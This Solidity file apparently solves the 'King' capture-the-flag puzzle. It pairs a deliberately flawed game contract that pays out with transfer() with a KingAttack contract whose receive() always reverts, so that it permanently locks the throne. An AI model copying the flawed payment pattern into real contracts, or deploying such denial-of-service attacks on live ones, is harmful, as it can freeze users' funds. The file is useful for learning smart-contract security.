// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract King {

  address payable king;
  uint public prize;
  address payable public owner;

  constructor() public payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    king.transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address payable) {
    return king;
  }
}

contract KingAttack{
    King king;

    constructor(address payable _king) payable public{
        king = King(_king);
    }

    function attack() public payable{
        require(msg.value == 1 ether, "please send exactly 1 ether");
        (bool success, ) = payable(address(king)).call{value: msg.value}("");
        require(success, "External call failed");
    }    
    
    receive() external payable {
        require(false, "External call failed");
    }
}